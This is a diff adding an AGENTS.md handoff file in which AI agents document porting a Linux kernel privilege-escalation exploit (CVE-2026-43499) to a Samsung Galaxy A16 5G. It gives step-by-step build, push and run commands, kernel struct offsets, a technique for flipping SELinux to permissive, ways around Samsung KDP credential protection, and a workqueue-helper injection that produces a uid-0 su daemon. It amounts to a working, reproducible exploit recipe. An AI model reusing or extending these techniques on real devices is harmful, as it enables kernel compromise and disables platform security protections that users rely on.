@@ -1,0 +1,585 @@
+# AGENTS.md — a16x (<device-model>) root-shell port: full handoff
+
+This file exists so the next agent can resume work **without re-deriving
+anything**. Read it top to bottom before touching code. It was last updated
+2026-08-13 **after root + the KernelSU module build were both achieved**.
+
+---
+
+## 0c. 📦 BACKUP (2026-08-13)
+
+A full backup of the irreplaceable work lives at:
+
+/path/to/work/backup-a16x-<timestamp>.tar.gz (41 MB)
+/path/to/work/backup-a16x-<timestamp>/ (unpacked)
+text
+
+
+It contains: `selinux_ghost.c`, `src/targets/a16x-<build-id>/` (target.h +
+embedded binaries), this AGENTS.md, the docs, the built payload
+(`build-a16x/`), the whole `kernelsu/` dir (including the a16x
+`android13-5.15.189_kernelsu-a16x-<build-id>-kdp.ko`), the KernelSU source
+fixes (`samsung_kdp.c` with the 5.15 `enum ucount_type` guard, `samsung_defex.c`,
+`ksu_samsung_kdp.h`, `Kbuild`), the built `kernelsu.ko` + `ksud-a16x`, the
+`a16-files/Module.symvers` + `vmlinux.btf`, `btf_dump.py`, `reroot_loop.sh`, and
+a `root-my-galaxy.diff` snapshot of the tracked-file changes. Restore by
+untarring over `/path/to/work/`.
+
+---
+
+## 0b. ✅ KernelSU MODULE BUILT & VALIDATED (2026-08-13)
+
+`kernelsu.ko` for the a16x is **built and passes the full symbol audit**.
+What is done and what remains for KernelSU:
+
+**Done:**
+- Cloned KernelSU `v3.2.5` (`b0bc817b…`) into
+  `/path/to/work/KernelSU-v3.2.5` and applied
+  `patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` (applies clean).
+- Fixed a 5.15 build error the patch had: `compat/samsung_kdp.c` used
+  `enum rlimit_type`, which is the **6.1+** name; 5.15 uses `enum ucount_type`
+  (`include/linux/user_namespace.h`). Added a `LINUX_VERSION_CODE` guard
+  (`>= 5.16` → rlimit_type, else ucount_type). This edit is on disk in the
+  KernelSU tree.
+- Built `kernelsu.ko` in the DDK container (host has **podman**; no docker):
+
+  ```bash
+  podman pull ghcr.io/ylarod/ddk-min:android13-5.15-20260313   # clang r450784e
+  podman run --rm -v /path/to/work/KernelSU-v3.2.5:/workspace:Z \
+    -w /workspace/kernel ghcr.io/ylarod/ddk-min:android13-5.15-20260313 bash -lc '
+      sed -i "s/5.15.202-android13-5.15.202_r00-dirty/5.15.189-android13-3-33503169/g" \
+        "$KDIR/include/generated/utsrelease.h" "$KDIR/include/config/kernel.release"
+      CONFIG_KSU=m CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y \
+      CONFIG_KSU_SAMSUNG_DEFEX=y CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y \
+      CC=clang make -j6
+      llvm-strip -d kernelsu.ko
+    '
+
+The :Z volume flag is REQUIRED — the host runs SELinux Enforcing and
+rootless podman; without :Z the mounted source is "Permission denied".
+
+    Verified the output: vermagic = 5.15.189-android13-3-33503169 SMP preempt mod_unload modversions aarch64 (exact match to the device), and the
+    __versions section is empty (size 0) as the manual-relocation loader
+    requires.
+
+    Ran the repo's symbol audit against the device vmlinux.elf:
+    bash
+
+    cd /path/to/work
+    distrobox enter fedora-43 -- bash -lc '
+      python3 Root-My-Galaxy-Payloads/kernelsu/tools/extract_target_symvers.py \
+        a16-files/vmlinux.elf a16-files/Module.symvers
+      python3 Root-My-Galaxy-Payloads/kernelsu/tools/audit_module_against_target.py \
+        KernelSU-v3.2.5/kernel/kernelsu.ko a16-files/vmlinux.elf \
+        a16-files/Module.symvers --manual-relocation
+    '
+
+    Result: 200 undefined symbols, 0 missing from the target symbol table,
+    64 resolved from kallsyms (trimmed exports), 0 CRC mismatches — all
+    symbols resolvable by name. The audit exits 0.
+
+    Stripped .ko (378,928 B) saved as
+    Root-My-Galaxy-Payloads/kernelsu/android13-5.15.189_kernelsu-a16x-<build-id>-kdp.ko.
+
+Why manual relocation (not plain insmod): the device has
+CONFIG_TRIM_UNUSED_KSYMS=y + CONFIG_MODVERSIONS=y. 64 of the module's
+imports are trimmed from the export table, so insmod would fail with
+"Unknown symbol". The ksud late-load loader resolves them by name from
+/proc/kallsyms (KALLSYMS_ALL=y gives all symbols) and loads via init_module.
+
+Remaining for KernelSU (the packaging/test phase):
+
+    Build the ksud late-load binary: needs a Rust toolchain
+    (aarch64-linux-android target; repo uses cross, but plain cargo + NDK
+    r29 linker works), build userspace/ksuinit (#![no_main] stage-1 binary,
+    gitignored), place android13-5.15_kernelsu.ko (= the built .ko, renamed)
+    into userspace/ksud/bin/aarch64/, then cargo build --release for
+    userspace/ksud. get_current_kmi() parses the uname release to
+    android13-5.15, so that exact asset name is required.
+
+    Re-root the device (section 0 recipe), push ksud, run
+    ksud late-load (or the su daemon's --late-load path, which execs
+    KSU_LOADER_PATH = /data/local/tmp/ksud-s25u-kdp — update that path/name).
+
+    Verify KernelSU Manager reports Working <LKM>, version 32525.
+
+Tooling notes: modinfo is NOT in the distrobox (use the DDK container).
+pyelftools 0.33 IS in the distrobox. No Rust/cargo anywhere yet — install via
+rustup in the distrobox (rustup target add aarch64-linux-android) and link
+with the NDK (~/.cargo/config.toml → [target.aarch64-linux-android]
+linker = .../aarch64-linux-android35-clang).
+0. ✅ ROOT ACHIEVED (2026-08-13)
+
+The uid-0 root shell works on the A16 (SM-S166V). The method is the
+ghost byte-write → workqueue-UMH injection → su daemon route described in
+section 8, with one final fix (refcount-pinning the forged pages) that was
+missing from the old plan below.
+
+Working reproduction (from a clean boot, device Enforcing):
+bash
+
+cd /path/to/work/Root-My-Galaxy-Payloads
+ANDROID_NDK_HOME=/path/to/work/android-ndk-r29 \
+  make TARGET=a16x-<build-id>
+
+distrobox enter fedora-43 -- bash -lc '
+adb push build/a16x-<build-id>/cve-2026-43499-app.so \
+  /data/local/tmp/rmg-a16x/app18.so
+adb push build/a16x-<build-id>/cve-2026-43499-root \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-root
+adb shell chmod 755 /data/local/tmp/rmg-a16x/cve-2026-43499-root
+'
+
+# Run (needs uptime >= 120s past the boot-quiet window); foreground streams log:
+distrobox enter fedora-43 -- bash -lc 'adb shell \
+  "GHOST_ROOT=1 EXPLOIT_ATTEMPTS=1 \
+   /data/local/tmp/rmg-a16x/cve-2026-43499-root --run-payload \
+   /data/local/tmp/rmg-a16x/app18.so \
+   /data/local/tmp/rmg-a16x/cve-2026-43499-root \
+   /data/local/tmp/rmg-a16x/exploit.log"'
+
+# Wait for:  [+] ghost root: UMH root helper running as uid 0 (su socket up)
+# Then use the su client (note: argv[1] is a shell script, so use -c):
+distrobox enter fedora-43 -- bash -lc 'adb shell \
+  "/data/local/tmp/rmg-a16x/cve-2026-43499-root -c id"'
+#   → uid=0(root) gid=0(root) groups=0(root) context=kernel
+
+Verified root evidence: id → uid=0(root), file created as root root,
+/proc/1/status readable, getenforce → Permissive. (/system/bin stays
+read-only — that is Android 16's erofs ro image, not a privilege failure.)
+
+The one bug that blocked it (now fixed): the channel pipe is drained
+between read/write ops, and draining put_page()s the forged high-DRAM slab
+pages (workqueue/pwq/pool live at ~33 GB phys, outside the 4 GB
+GHOST_HARDEN_SLOTS window). Freed slab got reallocated as a pipe data page
+and the 0x41 ('A') pad overwrote a live pool_workqueue → DABT in
+__queue_work. Fix: ghost_chan_prep() now pins the forged page's
+_refcount (+0x34) in the SAME helper exec as the forge (compound pages pin
+the page-aligned head, per put_page → compound_head semantics). Zero extra
+execs = zero extra hardlockup risk.
+
+mm-leak hardening (2026-08-13, built but NOT yet device-tested): the
+exploit is ~30-40% per attempt because prepare_pipe_buffer_page() +
+ghost_discover_slots() are probabilistic. A miss means the reclaimed order-3
+page held closed drain/shaping pipes (or a raced allocation) instead of the
+live reclaim pipes, so discovery maps zero in-page pipes. Previously a miss
+aborted to the supervisor, which re-ran the KASLR leak + SELinux flip + static
+hardening — the expensive, hardlockup-prone preamble — for nothing.
+ghost_install_root_cred() now retries the pure-userspace leak in-process
+up to GHOST_MM_RETRY (3) attempts / 2 retries via a retry_mm_leak: loop:
+reset_pipe_attempt() kills the leak child + closes its pipes, and each failed
+attempt has already told its keeper to release everything, so every retry
+starts clean. On a clean miss the keeper exits after releasing its pipes and
+the parent waitpid()s on it before re-running the leak, so the retry's
+F_SETPIPE_SZ never races the keeper's release into pipe-user-pages-hard
+EPERM; the ghost_harden_static_pages() failure path also releases the keeper
+before returning (it previously leaked the keeper's 240 pipe reservations into
+the supervisor retry). It only retries on a clean miss
+(ghost_mapped_count == 0); a probe-write failure after partial forging still
+aborts to the supervisor. Two corollaries: prepare_pipe_buffer_page() always
+returns an order-3-aligned address (leaked & ~0x7fff), so the old
+base & 0xfff misalignment check was dead code and was removed; and the
+in-process retry re-runs up to 16 slot probes per attempt, so
+GHOST_WRITE_WINDOW_STRIDE was raised 96 -> 192 (worst case ~160 windows per
+process: harden 13 + 3x discovery 96 + UMH ~51), giving 5 fake-lock window
+regions over the helper's 1024-entry table.
+1. TL;DR — where we are
+
+We ported the Root-My-Galaxy-Payloads CVE-2026-43499 exploit to a
+Samsung Galaxy A16 5G (<device-model>, codename a16x).
+
+    ✅ The goal was met: uid-0 root shell. See section 0 for the working
+    commands. The remaining work is packaging/persistence/KernelSU (section 8).
+
+    SELinux permissive flip works on-device (the selinux_permissive.c
+    POC the user wrote runs clean and flips /sys/fs/selinux/enforce 1 → 0).
+
+    The pselect / P0-oracle KASLR+write route is DEAD on this device.
+    Do not spend time on it. It reboots at page-prepare / times out on
+    wait_requeue_pi. Everything now goes through the ghost-write path.
+
+    The cred-overwrite route is DEAD on this device — root cause found.
+    Samsung KDP (Kernel Data Protection, CONFIG_KDP_CRED=y) makes every
+    credential read-only: init_cred is __kdp_ro, and every process cred lives
+    in the hypervisor write-protected cred_jar_ro slab. The ghost write's
+    rb_erase scribbles the parent pointer into value+0, so writing a cred
+    pointer as the value faults on the read-only cred page → the deterministic
+    panic. There is no writable cred on this device. Additionally
+    security_integrity_current() runs on every LSM hook and panics if a
+    task's cred isn't a genuine cred_jar_ro/tsec_jar object with matching
+    bp_task/bp_pgd, so pointing a task at init_cred or a fake cred also
+    panics.
+
+    The path forward is a byte-write primitive + modprobe_path overwrite.
+    The ghost read path's pipes already have flags=CAN_MERGE set by arming, so
+    a pipe whose page is ghost-forged to a target struct-page will write to
+    that page on write() (the DirtyPipe-style CAN_MERGE append). This gives a
+    side-effect-free arbitrary byte write to direct-map addresses — which
+    reopens modprobe_path (dead under the pointer-only ghost write, G1) and the
+    whole root.c UMH root. See section 8.
+
+2. The device (get these right — the user has corrected these twice)
+text
+
+model:       <device-model> (US <carrier>), codename a16x
+SoC:         Exynos 1330  (part number s5e8535; EVT 0.1)
+             NOTE: marketing name is "Exynos 1330", NOT "Exynos 8535".
+RAM:         4 GB         (user-confirmed — this bounds vmemmap sizing below)
+Android:     16 (SDK 36)
+fingerprint: samsung/<device>/a16x:16/<build-fingerprint>
+kernel:      5.15.189-android13-3-33503169
+page size:   4096
+KASLR:       nokaslr is NOT set — the slide changes every boot
+             (observed slides: 0x60000, 0xb8000, 0xc0000, 0xe8000, 0x130000,
+              0x180000, 0x1d8000 … — NOT always 64KB-aligned)
+boot_id:     changes every boot; used to tag persisted slide files
+
+Why this target is hard and different from the existing repo targets:
+
+    It is the first Exynos (s5e8535) 5.15.189 target in the repo. The other
+    5.15.189 references (dm3q/S23 Ultra, f731u/Z Fold 7) are Qualcomm and use
+    a proprietary/unknown method, so no layout value should be copied from them
+    blindly. (User explicitly said not to depend on the SM-S918B or SM-F731U
+    references — porting from them is extremely hard.)
+
+    cgroup.memory=nokmem in the boot cmdline ⇒ no kmalloc-cg-* caches,
+    so KMALLOC_CACHE_TYPES=2 and the pipe-buffer slab is kmalloc-rcl-2k.
+
+    arm64.nomte ⇒ MTE off.
+
+3. High-level exploit architecture (the "ghost write")
+
+The core primitive is a PI-chain ghost write — an arbitrary 8-byte kernel
+write built on rt_mutex futex machinery:
+
+    A sendmmsg(0,0,...) iovec spray leaves a dangling rt_mutex_waiter
+    on the stack of a helper thread Y.
+
+    A sched_setscheduler on Y triggers __rt_mutex_adjust_pi, which walks the
+    waiter as if it were a real PI chain and settles the "ghost" into a fake
+    rt_mutex waiters tree.
+
+    The write payload is a value whose structure (rb_erase walking the fake
+    tree and writing a parent pointer into value + 0) makes the kernel store a
+    chosen 8-byte value at a chosen address. Both the address and the value must
+    be walkable kernel pointers — see gotcha #G1.
+
+Two constraints that shape the whole design:
+
+    G1 — values must be walkable. The write works by rb_erase writing the
+    parent pointer into value + 0, so an ASCII string, a text pointer, or a
+    function pointer as the value faults (the early modprobe_path attempt
+    panicked exactly there). Only values that live at writable kernel addresses
+    (struct-page pointers in the vmemmap, direct-map data addresses, heap
+    objects) are legal. This rules out every classic write-only root:
+    modprobe_path, fake-fops/configfs, workqueue-UMH.
+
+    G2 — stack aliasing is call-depth sensitive. The iov array must alias
+    the waiter on thread Y's stack, and that only holds at the exact call depth
+    of the standalone binary. Running the same code as a preloaded .so
+    changes the stack layout and panics. Therefore the app payload embeds the
+    standalone binaries and fork+execs them in clean address spaces.
+
+The three executables
+
+    selinux_permissive — the user's original, proven POC (works on-device).
+    Does its own tracefs KASLR leak and flips selinux_state.enforcing 1 → 0.
+    Embedded in the app payload as ghost_permissive_bin.h.
+
+    ghost_write_helper — a generic single/batch ghost write. Reads
+    GHOST_WRITE_TARGET/GHOST_WRITE_VALUE (single) or GHOST_WRITE_LIST
+    (batch), plus GHOST_WRITE_WINDOW (starting fake-lock window index) and
+    SLIDE_P0_OFFSET (skip the tracefs leak). Embedded as
+    ghost_write_helper_bin.h.
+
+    The app payload (cve-2026-43499-app.so) — orchestrates the whole flow
+    and embeds both binaries above.
+
+The root flow implemented in src/selinux_ghost.c
+text
+
+1. tracefs KASLR leak            → slide (ghost_tracefs_kaslr)
+2. flip SELinux → permissive     → exec embedded selinux_permissive (works)
+3. reclaim pipe_buffer slab page → prepare_pipe_buffer_page() (KernelSnitch "mm leak")
+4. arm 240 reclaim pipes         → ghost_arm_pipes()
+5. fork "keeper" (BEFORE forging)→ holds forged pipes so free_pipe_info never runs
+6. refcount-harden static pages  → empty_zero_page + init_task neighbors (batch)
+7. discover slot→pipe mapping    → 16 object slots probed with empty_zero_page
+8. read path                     → forge pipe_buffer.page = struct page of any
+                                    kernel page ⇒ pipe_read returns its bytes
+                                    (arbitrary kernel read)
+9. fork "ll_root_child"          → newest task in the task list
+10. walk task list               → find child's task_struct (backward from init_task)
+11. capture writable root cred   → pid 1/2's real_cred (init_cred is .rodata!)
+12. 2-write cred overwrite       → child's real_cred + cred := root cred  ← PANICS HERE
+13. child setuid(0), exec su daemon → root shell
+
+4. Current state, step by step
+
+Verified working on-device (do not re-litigate these):
+Step	Status	Notes
+tracefs KASLR leak	✅	sched_blocked_reason event id 108; retry loop, 3s read window
+SELinux permissive flip	✅	via embedded selinux_permissive; user confirmed
+ghost write (single)	✅	ghost_write_once
+ghost write (batch)	✅	ghost_write_batch — helper now supports GHOST_WRITE_LIST
+pipe reclaim + arm	✅	prepare_pipe_buffer_page() mm leak is solid
+keeper + refcount hardening	✅	protects against free_unref_page / free_pipe_info panics
+slot discovery (16 slots)	✅	empty_zero_page probe
+arbitrary kernel read	✅	run6 proved it end-to-end (zero-page probe, init_task verified swapper/0)
+task-list walk	✅	found ll_root_child
+capture writable root cred	✅	pid 1 real_cred captured (but it is a read-only cred_jar_ro — see below)
+final cred overwrite	❌	deterministic panic — KDP, not fixable by patching offsets
+The cred overwrite can never work (KDP) — read this before touching creds
+
+Pulled the bugreport and confirmed the panics are the known hardlockup plus a
+write fault on a read-only cred. Then verified against the shipped kernel
+source (android_kernel_a166b/drivers/uh/kdp.c, include/linux/cred.h,
+kernel/cred.c):
+
+    CONFIG_KDP_CRED=y; struct cred_kdp { struct cred cred; atomic_t *use_cnt; struct task_struct *bp_task; void *bp_pgd; u64 type; } — cred at offset 0.
+
+    init_cred is __kdp_ro (.rodata); all process creds come from
+    cred_jar_ro, a slab the hypervisor write-protects at stage-2
+    (uh_call(UH_APP_KDP, …)). There is no writable cred.
+
+    security_integrity_current() is inlined into call_void_hook/
+    call_int_hook (security/security.c), i.e. it runs on every LSM hook
+    and panic("KDP CRED PROTECTION VIOLATION") unless the cred is a genuine
+    cred_jar_ro/tsec_jar object AND bp_task == current AND
+    bp_pgd ∈ {swapper_pg_dir, mm->pgd}.
+
+    The ghost write writes *(u64*)target = value and also scribbles the
+    rb_erase parent pointer into value+0 (G1). With value = root cred that
+    store lands on the read-only cred page → the deterministic panic.
+
+So: writing a cred pointer as the value, writing into a cred, or pointing a
+task at init_cred/a fake cred all panic. The old plan ("capture a writable
+root cred and overwrite the child's cred pointers") is dead. The whole
+read path / task walk / slot discovery still works and is reusable.
+
+The exact symptom (run10): the log ends cleanly at
+text
+
+ghost root: write real_cred/cred task=… -> root_cred=0xffffff887f26f000
+write[0] target=… value=…
+
+…and then nothing — the device panics (adb drops, boot_id changes on
+reconnect, and the unflushed /data/local/tmp log is lost). It is not
+statistical (~5%/exec hardlockup risk); it is deterministic at this write.
+Why the cred overwrite is the risky write (the current hypothesis)
+
+The overwrite does child->real_cred = child->cred = <root cred> where the
+root cred is pid 1's heap cred (uid 0, full caps, writable). Two suspects
+to check first:
+
+    The captured cred address looked wrong. 0xffffff887f26f000 is in the
+    direct map (0xffffff8000000000–0xffffff9000000000), which is plausible for
+    a heap cred — but it should be verified against the actual layout. If the
+    read returned a page whose contents are not really a cred, the write
+    target/value combination would still be "walkable" and the panic could come
+    from rb_erase walking a garbage tree inside the written page.
+
+    init_cred is .rodata on this kernel (offset 0x1b6cab8 sits between
+    __start_rodata 0x10f0000 and __end_rodata 0x215c000). Writing &init_cred
+    as the value scribbles rb_erase's parent-color into read-only memory →
+    panic. That is exactly why the code was changed to capture pid 1/2's heap
+    cred instead. Double-check the captured value is not still init_cred.
+
+The offsets to verify first (most likely root cause)
+
+The cred field offsets are the last thing not yet independently re-verified:
+c
+
+#define TASK_REAL_CRED_OFF  0x790   /* task_struct.real_cred */
+#define TASK_CRED_OFF       0x798   /* task_struct.cred */
+#define TASK_TASKS_OFF      0x4d0   /* task_struct.tasks (list_head) */
+#define TASK_PID_OFF        0x5d8
+#define TASK_COMM_OFF       0x7a8
+
+These came from vmlinux.btf / vmlinux.elf, but the cred-overwrite panic is
+consistent with one of TASK_REAL_CRED_OFF/TASK_CRED_OFF being wrong (writing
+into the middle of some other field that rb_erase then interprets as a tree).
+Verify against a16-files/vmlinux.elf (BTF) and a16-files/vmlinux.nm.
+5. Build / push / run (exact commands)
+
+Everything lives under /path/to/work/.
+Build (NDK r29, must match the embedded helper toolchain)
+bash
+
+cd /path/to/work/Root-My-Galaxy-Payloads
+ANDROID_NDK_HOME=/path/to/work/android-ndk-r29 \
+  make TARGET=a16x-<build-id>
+
+Outputs:
+
+    build/a16x-<build-id>/cve-2026-43499 (preload)
+
+    build/a16x-<build-id>/cve-2026-43499-app.so (app payload — this is the one)
+
+    build/a16x-<build-id>/cve-2026-43499-root (root helper / su daemon)
+
+The fresh app payload is currently 176,632 bytes (04:50 build). The file
+committed at artifacts/a16x-<build-id>/cve-2026-43499-app.so
+(156,408 bytes) is STALE — it predates the batch write helper and must
+be regenerated before publishing. The doc's "156,408 bytes" note is outdated.
+ADB (must go through distrobox)
+
+adb is only available inside the fedora-43 distrobox:
+bash
+
+distrobox enter fedora-43 -- bash -lc 'adb devices'
+
+The device serial is <device-serial>. After a panic the device reboots and adb
+reconnects automatically; poll with adb wait-for-device.
+Push and run (DETACHED — see gotcha #G6)
+bash
+
+distrobox enter fedora-43 -- bash -lc 'adb push \
+  /path/to/work/Root-My-Galaxy-Payloads/build/a16x-<build-id>/cve-2026-43499-app.so \
+  /data/local/tmp/rmg-a16x/  && \
+  adb push \
+  /path/to/work/Root-My-Galaxy-Payloads/build/a16x-<build-id>/cve-2026-43499-root \
+  /data/local/tmp/rmg-a16x/'
+
+Run (the helper is the --run-payload runner; env vars select mode):
+bash
+
+distrobox enter fedora-43 -- bash -lc 'adb shell "nohup \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-root --run-payload \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-app.so \
+  /data/local/tmp/rmg-a16x/cve-2026-43499-root \
+  /data/local/tmp/rmg-a16x/exploit.log >/dev/null 2>&1 &"'
+
+Then poll the log from the host (so a panic can't erase it):
+bash
+
+distrobox enter fedora-43 -- bash -lc 'adb shell cat /data/local/tmp/rmg-a16x/exploit.log'
+
+Env knobs used by the flow (set before --run-payload on the shell line):
+
+    GHOST_ONLY=1 — stop after the SELinux flip (verification mode).
+
+    GHOST_DIAG=1 — extra rodata-alias read-back diagnostics (costs ~6 execs).
+
+    GHOST_WRITE_WINDOW_BASE=N / GHOST_FLIP_WINDOW_BASE=N — attempt-scoped
+    fake-lock window seeding (see gotcha #G4).
+
+6. Key files map
+
+Inside Root-My-Galaxy-Payloads/:
+File	Role
+src/selinux_ghost.c	the entire ghost flow — KASLR leak, flip, write once/batch, pipe reclaim, keeper, hardening, slot discovery, read path, task walk, cred capture, cred overwrite. ~1780 lines. The bug is near the end (ghost_install_root_cred).
+src/targets/a16x-<build-id>/target.h	every offset/constant for this device
+src/targets/a16x-<build-id>/ghost_permissive_bin.h	embedded selinux_permissive binary
+src/targets/a16x-<build-id>/ghost_write_helper_bin.h	embedded ghost_write_helper binary (512-pair / 1024-window table)
+src/targets/a16x-<build-id>/p0_fingerprint.h	32 slide rows (kept for reference; pselect route is dead)
+src/pipe.c	prepare_pipe_buffer_page() (the mm leak) + pipe fds
+src/main.c, src/preload.c, src/root.c, src/slide.c, src/slide_app.c	harness; slide.c is the tracefs-leak path, slide_app.c the dead pselect path
+docs/SM-S166V-S166VUDU7DZE9.md	port record (has a stale "Exynos 8535" naming and stale 156,408 size)
+
+Inside /path/to/work/ (NOT in the repo):
+Path	Role
+selinux_permissive.c	the user's original, proven POC (747 lines) — the reference for every ghost-write detail
+ghost_write_helper.c	standalone batch helper source (635 lines)
+ghost_write_helper	compiled helper binary (16,824 bytes)
+a16-files/vmlinux.elf, vmlinux.nm, boot.img, vendor_boot.img, kernel, dtbo.img, magiskboot	firmware artifacts — all offsets are verified against these
+android-ndk-r29/	the NDK (must match the embedded binaries' toolchain)
+android_kernel_a166b/	full kernel source tree (for the KernelSU step later)
+SM-S918B-main/, SM-F731U -repo/	other ports — do not copy layout from these
+7. Gotchas learned the hard way (read before debugging)
+
+    G1 — write values must be walkable. rb_erase writes the parent pointer
+    into value + 0. Text/function-pointer/ASCII values fault and panic.
+
+    G2 — never reuse a walked fake-lock tree. Each ghost write leaves its
+    fake lock's waiters tree modified; the next write over the same window chases
+    corrupt links → rt_mutex_adjust_prio_chain panic (observed K2608130429).
+    The parent must rotate windows (n+1 per batch of n) and seed the counter
+    per-attempt via GHOST_WRITE_WINDOW_BASE / GHOST_FLIP_WINDOW_BASE.
+
+    G3 — pr_error exits -1. In selinux_ghost.c, use pr_warning for any
+    retryable condition; pr_error terminates the process (child dies at 255).
+
+    G4 — the KASLR slide changes every boot and is not always 64KB-aligned.
+    Do not impose a 64KB-alignment sanity check. Persist it per-boot (tagged with
+    boot_id) because re-running the flip child a second time re-walks the same
+    window and panics.
+
+    G5 — every helper exec costs ~5% hardlockup risk. The panic rate is
+    per-exec; batching (fewer execs) is the main lever. That's why hardening and
+    the cred write use ghost_write_batch. GHOST_PIPE_MAX_MAPPED was lowered
+    from 12 → 8 because 12 discovery writes + ~25 read execs blew past the budget
+    and panicked (run7).
+
+    G6 — run the exploit detached and capture the log on the host. A panicking
+    kernel loses the device-side log (unflushed fs), and a client-side shell
+    timeout orphans the device process, which then holds the keeper's pipe
+    budget (F_SETPIPE_SZ → EPERM on the next run). Use nohup … &, poll from
+    the host, and kill orphaned --run-payload/keeper processes between runs.
+
+    G7 — the keeper must fork before any forging. It holds the forged pipes
+    so free_pipe_info() at exit doesn't put_page() a kernel page. It prunes
+    to only the mapped pipes via a 'PEEK' message; on a bad message it keeps all
+    240 (safe but costs pipe-user-pages on retry).
+
+    G8 — init_cred is read-only. It sits in .rodata; writing &init_cred
+    into a task's cred panics on the rb_erase parent-color scribble. Use pid 1/2's
+    heap cred instead (already done — just verify it's actually a heap cred).
+
+    G9 — image aliasing is DIRECT_MAP_BASE + slide + off, not +off and not
+    +0x80000000+off. The ghost pipe's page field and direct_to_page() all
+    use direct-map addresses, never image VAs (0xffffffc00…). Feeding an image
+    VA to direct_to_page() panics. The +slide model was proven empirically
+    (see the long comment above ghost_data_alias_fn in selinux_ghost.c).
+
+8. What's left (the plan from here)
+
+✅ DONE (2026-08-13): the workqueue-UMH injection route achieved uid-0.
+The byte-write primitive + UMH root are implemented in selinux_ghost.c
+(ghost_chan_prep/ghost_read_at/ghost_write_bytes/ghost_install_umh_root)
+and verified on-device. modprobe_path was ruled out earlier
+(CONFIG_STATIC_USERMODEHELPER=y + empty ..._PATH makes every
+call_usermodehelper() a no-op), so the route that works is the one root.c
+already used on Qualcomm: fabricate a subprocess_info in a reclaimed slab
+page tail, queue it on system_unbound_wq via a forged worklist entry, and let
+call_usermodehelper_exec_work() run the --umh helper as uid 0 with a
+legitimate KDP cred. The su daemon then listens on
+/data/local/tmp/temp_su.sock and the cve-2026-43499-root client execs
+commands as root (-c form; argv[1] is a shell script, not a program path).
+
+Remaining milestones (no longer blockers):
+
+    Reproduce from a cold reboot (confirm the exact run command from section
+    0 is the canonical flow, not just a warm-boot artifact).
+
+    Package/persistence: regenerate + re-publish the stale
+    artifacts/a16x-<build-id>/cve-2026-43499-app.so (committed copy is
+    still 156,408 B; fresh build is ~176,608 B). Update
+    docs/SM-S166V-S166VUDU7DZE9.md (still says "Exynos 8535", stale size).
+
+    KernelSU (later milestone): android13-5.15.189 KO from KernelSU v3.2.5
+
+        Samsung KDP/RKP/DEFEX patch against android_kernel_a166b/, exact vermagic.
+
+Watch items: panic boot_ids K26081302xx/K26081304xx were the historical
+free_unref_page / rt_mutex panics now fixed by hardening + keeper + window
+rotation. The cred-write panic is explained by KDP (above), not a bug. The
+final panic before success was the 0x41-pad-into-pool_workqueue DABT, fixed
+by the _refcount pin in ghost_chan_prep (section 0).
+9. Quick answers to questions you will have
+
+    "Why not just write modprobe_path?" → the pointer-only ghost write
+    can't carry a string value (G1). The new plan adds a CAN_MERGE byte write
+    that can — see section 8.
+
+    "Why exec standalone binaries instead of calling the code in-process?"
+    → G2: the PI-chain stack aliasing only holds at the standalone call depth.
+
+    "Why is there a keeper process?" → G7: keep forged pipes alive so exit
+    doesn't put_page() kernel pages.
+
+    "Can I use the SM-S918B / SM-F731U port as a reference?" → No. Qualcomm,
+    proprietary method; the user explicitly warned against it.
+
+    "Is the 4GB RAM relevant?" → Yes: GHOST_HARDEN_SLOTS = 1<<20 struct
+    pages = 4GB of RAM. Don't shrink it thinking it's oversized.
